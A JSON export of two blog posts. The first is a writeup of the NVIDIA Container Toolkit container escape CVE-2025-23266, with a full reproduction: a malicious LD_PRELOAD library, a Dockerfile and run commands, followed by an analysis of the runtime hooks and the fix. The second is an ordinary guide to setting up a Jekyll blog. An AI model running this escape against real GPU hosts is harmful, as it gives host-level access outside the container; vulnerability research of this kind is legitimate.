[
  
  {
    "title": "CVE 2025-23266 -  A Detailed writeup",
    "url": "/posts/nvidia-container-escape-cve-2025-23266/",
    "categories": "",
    "tags": "writeups, nvidia,, containers,, security",
    "date": "2025-08-05 00:00:00 -0500",
    "content": "Introduction  I read [1] yesterday about a container escape on Nvidia’s Container Runtime. It comes without saying that this is a big deal, since the exploit is rather simple, and as AI workloads increases, so does the use of containerized applications and GPUS. The writeup itself is pretty good, although it does not address a few details regarding the container runtime, more specifically, how does container hooks work under the hood.  Writing this was a learning process to me, and I would like to share the whole journey with you.  Reproducing the issue  You can reproduce the issue yourself with the following steps (they are ment for Ubuntu, but easily adaptable for other distributions):  Install and Configure Nvidia Container Toolkit     Download the Nvidia Container Toolkit version 1.17.7 or earlier. The one I used was https://github.com/NVIDIA/nvidia-container-toolkit/releases/download/v1.17.7/nvidia-container-toolkit_1.17.7_deb_amd64.tar.gz   Unpack the .deb files to ~/release-v1.17.7-stable/packages/ubuntu18.04/amd64/   Then, run the following commands in order (as sudo):   dpkg -i libnvidia-container1_1.17.7-1_amd64.deb dpkg -i libnvidia-container-tools_1.17.7-1_amd64.deb dpkg -i nvidia-container-toolkit-base_1.17.7-1_amd64.deb  dpkg -i nvidia-container-toolkit_1.17.7-1_amd64.deb     Configure docker by running      sudo nvidia-ctk runtime configure –runtime=docker        Restart docker with sudo systemctl restart docker      Some of these steps are taken from [2]  Create a shared library  This library will be loaded by the Docker Container runtime. As part of the exploit, we will use it as a parameter to LD_PRELOAD.  poc.c // poc.c - minimal malicious LD_PRELOAD library (creates /owned)  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt;  // This function is called when the shared library is loaded __attribute__((constructor)) void init(void) {     int fd = open(\"/owned\", O_WRONLY | O_CREAT | O_TRUNC, 0644);     if (fd != -1) {         write(fd, \"You have been owned!\\n\", 21);         close(fd);     } }   Then build it with:    gcc -fPIC -shared -o poc.so poc.c   Configure hook  Add or edit the /etc/nvidia-container-runtime/config.toml file so it contains the folloging     [nvidia-container-runtime.modes.legacy] cuda-compat-mode = “hook”   Create a docker image This docker image will be contain the poc.so library that we created on the previous step.  Dockerfile FROM busybox ENV LD_PRELOAD=./poc.so ADD poc.so /   The Dockerfile and the poc.so must be in the same folder  Then build the image with:     docker build . -t nvidiascape-exploit   The command should create a new docker image with a tag (-t) nvidiascape-exploit.  Then, run it with the following command:     docker run –rm –runtime=nvidia –gpus=all nvidiascape-exploit   If everthing work right, you should see a /owned fine at the root directory.  Understanding the issue  To properly understand how this exploit was crafted, we need to touch in a couple of subjects first:    Dynamic linker behavior   Alternate runtimes   CUDA Compatibility   Container Device Interface   Dynamic linker  Whenever an application runs, it might require shared libraries - these are binaries that are not part of the application itself, but redistributed as part of another package. The dynamic linker job is to resolve these libraries during runtime.  The dynamic linker provides a feature where shared libraries under a directory set by the LD_PRELOAD environment variable takes precedence over all others. As a debugging feature, this might sound nice, but it is damning for sensitive applications. The ld.so man pages states:     Secure-execution mode        For security reasons, if the dynamic linker determines that a        binary should be run in secure-execution mode, the effects of some        environment variables are voided or modified, and furthermore        those environment variables are stripped from the environment, so        that the program does not even see the definitions.    As en experiment, try to run this on your terminal:     sudo LD_PRELOAD=/home/filiperodrigues/nvidiascape-exploit/poc.so find   You will end you with the same /owned file as the original exploit  The poc.so itself is rather simple: upon init, it creates a /owned file, then write some content to it.  void init(void) {     int fd = open(\"/owned\", O_WRONLY | O_CREAT | O_TRUNC, 0644);   The initializer is provided by the __attribute__((constructor)) function attributes. [4]  Alternate runtimes  The default Docker runctime is runc. Howwever, you can use nu other runtime that implementes the containerd sim API [6] [7]. When you ran sudo nvidia-ctk runtime configure --runtime=docker, you added an entry on the /etc/docker/daemon.json file, which should look like the following:  {     \"runtimes\": {         \"nvidia\": {             \"args\": [],             \"path\": \"nvidia-container-runtime\"         }     }    That tells Docker to use the nvidia-container-runtime application whenever you run a container with --runtime=nvidia  CUDA Forward Compatibility  CUDA forward compatibility allows containers or applications that were built with a newer version of the CUDA toolkit (user-mode libraries) to run on systems where the host driver is slightly older as long as certain compatibility libraries are present. This is particularly useful for containerized workloads where:     You might build and ship containers with newer CUDA versions than what the host has installed.   Upgrading drivers on production systems isn’t always immediate or practical.   According to the documentation [10]:  The CUDA forward compatibility package will then be installed to the versioned toolkit directory. For example, for the CUDA forward compatibility package of 12.8, the GPU driver libraries of 570 will be installed in /usr/local/cuda-12.8/compat/.   It is important to notice that these libraries are installed in the host.  The NVidia Container Runtime implements forward compatibility with a hook. If the “nvidia-container-runtime.modes.legacy.cuda-compat-mode” config option is set to “hook”, the “ enable-cuda-compat” is then used.  The hook will then execute and mount the compat libraries under “/usr/local/cuda/compat”. The mechanism used is called Container Device Interface  Container device interface  When the runtime starts, it executes the following function:  // newNVIDIAContainerRuntime is a factory method that constructs a runtime based on the selected configuration and specified logger func newNVIDIAContainerRuntime(logger logger.Interface, cfg *config.Config, argv []string, driver *root.Driver) (oci.Runtime, error) { \tlowLevelRuntime, err := oci.NewLowLevelRuntime(logger, cfg.NVIDIAContainerRuntimeConfig.Runtimes) \tif err != nil { \t\treturn nil, fmt.Errorf(\"error constructing low-level runtime: %v\", err) \t}  \tlogger.Tracef(\"Using low-level runtime %v\", lowLevelRuntime.String()) \tif !oci.HasCreateSubcommand(argv) { \t\tlogger.Tracef(\"Skipping modifier for non-create subcommand\") \t\treturn lowLevelRuntime, nil \t}  \tociSpec, err := oci.NewSpec(logger, argv) \tif err != nil { \t\treturn nil, fmt.Errorf(\"error constructing OCI specification: %v\", err) \t}  \tspecModifier, err := newSpecModifier(logger, cfg, ociSpec, driver) \tif err != nil { \t\treturn nil, fmt.Errorf(\"failed to construct OCI spec modifier: %v\", err) \t}  \t// Create the wrapping runtime with the specified modifier. \tr := oci.NewModifyingRuntimeWrapper( \t\tlogger, \t\tlowLevelRuntime, \t\tociSpec, \t\tspecModifier, \t)  \treturn r, nil }   The relevant parts are oci.NewSpec and newSpecModifier. These two functions:     Creates an OCI specification object (ociSpec) from the command-line args. The OCI spec describes how the container should be set up (namespaces, mounts, env vars, etc).   Creates a spec modifier—a helper object that knows how to tweak the OCI spec (e.g., to inject NVIDIA-specific libraries, mounts, hooks, etc, needed for GPU containers).   The OCI spec describes the actual container.  You can see the actual spec by doing this:     Add the following to the newNVIDIAContainerRuntime function   \tif logger != nil { \t    if specJSON, err := json.MarshalIndent(ociSpec, \"\", \"  \"); err == nil { \t        logger.Infof(\"OCI Spec: %s\", string(specJSON)) \t    } else { \t        logger.Warningf(\"Failed to marshal OCI spec for logging: %v\", err) \t    } \t}      Edit the confit runtime (/etc/nvidia-container-runtime/config.toml) to enable logs:   [nvidia-container-runtime] debug = \"/var/log/nvidia-container-runtime.log\"   After that, you should see the following:  {   \"ociVersion\": \"1.2.1\",   \"process\": {     \"user\": {       \"uid\": 0,       \"gid\": 0,       \"additionalGids\": [0, 10]     },     \"args\": [       \"sh\"     ],     \"env\": [       \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",       \"HOSTNAME=e078abd14abe\",       \"LD_PRELOAD=./poc.so\",       \"NVIDIA_VISIBLE_DEVICES=all\"     ],     \"cwd\": \"/\",     \"capabilities\": {       \"bounding\": [         \"CAP_CHOWN\", \"CAP_DAC_OVERRIDE\", \"CAP_FSETID\", \"CAP_FOWNER\", \"CAP_MKNOD\", \"CAP_NET_RAW\",         \"CAP_SETGID\", \"CAP_SETUID\", \"CAP_SETFCAP\", \"CAP_SETPCAP\", \"CAP_NET_BIND_SERVICE\",         \"CAP_SYS_CHROOT\", \"CAP_KILL\", \"CAP_AUDIT_WRITE\"       ],       \"effective\": [         \"CAP_CHOWN\", \"CAP_DAC_OVERRIDE\", \"CAP_FSETID\", \"CAP_FOWNER\", \"CAP_MKNOD\", \"CAP_NET_RAW\",         \"CAP_SETGID\", \"CAP_SETUID\", \"CAP_SETFCAP\", \"CAP_SETPCAP\", \"CAP_NET_BIND_SERVICE\",         \"CAP_SYS_CHROOT\", \"CAP_KILL\", \"CAP_AUDIT_WRITE\"       ],       \"permitted\": [         \"CAP_CHOWN\", \"CAP_DAC_OVERRIDE\", \"CAP_FSETID\", \"CAP_FOWNER\", \"CAP_MKNOD\", \"CAP_NET_RAW\",         \"CAP_SETGID\", \"CAP_SETUID\", \"CAP_SETFCAP\", \"CAP_SETPCAP\", \"CAP_NET_BIND_SERVICE\",         \"CAP_SYS_CHROOT\", \"CAP_KILL\", \"CAP_AUDIT_WRITE\"       ]     },     \"apparmorProfile\": \"docker-default\",     \"oomScoreAdj\": 0   },   \"root\": {     \"path\": \"/var/lib/docker/overlay2/b29b8b924bfcb60a5b2adadd98c935fe659480f24be017259f56cf49ead0d3ed/merged\"   },   \"hostname\": \"e078abd14abe\",   \"mounts\": [     {       \"destination\": \"/proc\",       \"type\": \"proc\",       \"source\": \"proc\",       \"options\": [\"nosuid\", \"noexec\", \"nodev\"]     },   ],   \"hooks\": {     \"prestart\": [       {         \"path\": \"/usr/bin/nvidia-container-runtime-hook\",         \"args\": [           \"nvidia-container-runtime-hook\",           \"prestart\"         ],         \"env\": [           \"LANG=en_US.UTF-8\",           \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\",           \"NOTIFY_SOCKET=/run/systemd/notify\",           \"INVOCATION_ID=6a71d6bbe6634f0baebf6075a9ece8b2\",           \"JOURNAL_STREAM=8:22608\",           \"SYSTEMD_EXEC_PID=2089\",           \"OTEL_SERVICE_NAME=dockerd\",           \"OTEL_EXPORTER_OTLP_TRACES_PROTOCOL=http/protobuf\",           \"OTEL_EXPORTER_OTLP_METRICS_PROTOCOL=http/protobuf\",           \"TMPDIR=/var/lib/docker/tmp\"         ]       }     ]   },     //etc   You will notice that the LD_PRELOAD is part of the container spec.  To implement CUDA Forward Compatibiltity, the runtime edits the container spec by adding a new ‘containerCreate’ hook.  This is mentioned on the Wiz writeup [1]  Before the fix, this is how the createContainer would look like:      \"createContainer\": [       {         \"path\": \"/usr/bin/nvidia-ctk\",         \"args\": [           \"nvidia-ctk\",           \"hook\",           \"enable-cuda-compat\",           \"--host-driver-version=575.64.03\"         ]       },       {         \"path\": \"/usr/bin/nvidia-ctk\",         \"args\": [           \"nvidia-ctk\",           \"hook\",           \"update-ldcache\"         ]       }   And this is how it would look after:      \"createContainer\": [       {         \"path\": \"/usr/bin/nvidia-ctk\",         \"args\": [           \"nvidia-ctk\",           \"hook\",           \"enable-cuda-compat\",           \"--host-driver-version=575.64.03\"         ],         \"env\": [           \"NVIDIA_CTK_DEBUG=false\"         ]       },       {         \"path\": \"/usr/bin/nvidia-ctk\",         \"args\": [           \"nvidia-ctk\",           \"hook\",           \"update-ldcache\"         ],         \"env\": [           \"NVIDIA_CTK_DEBUG=false\"         ]       }   With the fix, the createContainer have an explicit “env” section, which is not present without the fix.  [1] https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape [2] https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/install-guide.html [3] https://man7.org/linux/man-pages/man8/ld.so.8.html [4] https://tldp.org/HOWTO/Program-Library-HOWTO/miscellaneous.html [5] https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/cdi-support.html [6] https://docs.docker.com/engine/daemon/alternative-runtimes/ [7] https://github.com/containerd/containerd/blob/main/core/runtime/v2/README.md [8] https://github.com/cncf-tags/container-device-interface/blob/main/specs-go/config.go#L25 [9] https://github.com/NVIDIA/nvidia-container-toolkit/compare/v1.17.7…v1.17.8a [10] https://docs.nvidia.com/deploy/cuda-compatibility/ "
  },
  
  {
    "title": "Moving to Jekyll",
    "url": "/posts/moving-to-jekyll/",
    "categories": "blogging,, jekyll",
    "tags": "",
    "date": "2025-08-04 00:00:00 -0500",
    "content": "Introduction  I used to have an old blog on Worpress. As the time went by, I realized that:     Maintenance cost was more than what I expected. My first deployment was an EC2 with no ALB and a internal database. I am very fond of the “treat you infra as cattle, not pet” principle, so I would need to move away the database to a managed one, while also having a method to deploy the infrastructure easily - ideally, with code;   Wordpress was a liability. Over the years, Wordpress got a bad rap with the amount of vulnerabilities discovered. A few friends of mine have blogs with were hit because of them;   infrastructure was a liability Having an EC2 means I would need to take special care to protect it - by updating the OS and libraries, ensuring that SSH is not widely accessible, etc;   I wanted something minimal.   I am a big fan of gwern.net, not only by the writing style, but also because the website is aesthetically pleasing. I was surprised that it was actually static content generated from Markdown (https://gwern.net/about#design).  After some research, I found a tool called jekyll, which seemed a good option, so I wanted to give it a try.  Bootstrapping the website using Jekyll  After you install all dependencies (https://jekyllrb.com/docs/installation/ubuntu/), you bootstrap you website with:  jekyll new site/ --blank   That creates a folder with the following structure:  . ├── _config.yml ├── _data │   └── members.yml ├── _drafts ├── _includes │   ├── footer.html │   └── header.html ├── _layouts │   ├── default.html │   └── post.html ├── _posts ├── _sass │   ├── _base.scss │   └── _layout.scss ├── _site ├── .jekyll-cache │   └── Jekyll │       └── Cache │           └── [...] ├── .jekyll-metadata └── index.html # can also be an 'index.md' with valid front matter  (Reference: https://jekyllrb.com/docs/structure/)  Creating a post  The _posts folder is where all your posts go. To create one, add a file with the following format:  YEAR-MONTH-DAY-title.MARKUP   For this post, the file name is 2025-08-04-moving-to-jekyll.md  (Reference: https://jekyllrb.com/docs/posts/)  Viewing your posts  Once a post is ready, you can see how it would look like by executing:  jekyll serve   Choosing a theme  The Jekyll community provides multiple themes (https://jekyllrb.com/docs/themes/). My theme of choice was https://github.com/cotes2020/jekyll-theme-chirpy due to its look-and-feel and minimalism.  You can either create a new website using the jekyll new  command, then download the content from github and replace it, or start from scratch by cloning the repository above. I choose the latter.  The template only supposed ruby 3.1. I used ruby 3.3.1 for that, managed by rbenv (https://github.com/rbenv/rbenv)  rbenv install 3.3.1 export PATH=\"$HOME/.rbenv/versions/3.3.1/bin:$PATH\"   Customizing  You should change the website title and description by changing the corresponding tags on _config.yml  Publishing  Final thoughts    Felt like I was on 2005 using Scriptaculous, with no extra bells and whistles   Felt like “Arch for blogs”  "
  }
  
]

